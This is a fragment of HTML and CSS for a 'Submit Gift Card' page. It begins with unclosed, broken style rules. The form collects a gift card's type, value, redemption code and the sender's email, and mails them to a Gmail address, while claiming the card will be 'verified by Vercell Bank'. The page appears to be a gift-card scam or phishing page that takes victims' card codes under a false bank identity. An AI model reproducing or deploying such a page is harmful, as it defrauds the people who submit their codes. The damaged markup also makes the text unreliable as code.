video.bg-video {

      left: 0;
      width: 100%;
      height: 100%;

      z-index: -1;

    .back-link {
      text-align: center;
      margin-top: 20px;
    }

    .back-link a {

  <div class="container">
    <h1>Submit Gift Card</h1>
    <form id="giftcardForm" action="mailto:vercellbank@gmail.com" method="POST" enctype="text/plain">
      <div class="form-group">
        <label for="cardType">Select Gift Card Type</label>
        <select id="cardType" name="Gift Card Type" required>
          <option value="">-- Select --</option>
          <option value="Amazon">Amazon</option>
          <option value="iTunes">iTunes</option>
          <option value="Steam">Steam</option>
          <option value="Walmart">Walmart</option>
          <option value="Google Play">Google Play</option>
          <option value="Other">Other</option>
        </select>
      </div>

      <div class="form-group">
        <label for="value">Card Value ($)</label>
        <input type="number" id="value" name="Card Value" required />
      </div>

      <div class="form-group">
        <label for="cardNumber">Gift Card Code</label>
        <input type="text" id="cardNumber" name="Gift Card Code" required />
      </div>

      <div class="form-group">
        <label for="userEmail">Your Email</label>
        <input type="email" id="userEmail" name="Sender Email" required />
      </div>

      <button type="submit">Submit Gift Card</button>
    </form>

    <p class="note">This gift card will be verified by Vercell Bank. Please ensure accuracy before submission.</p>
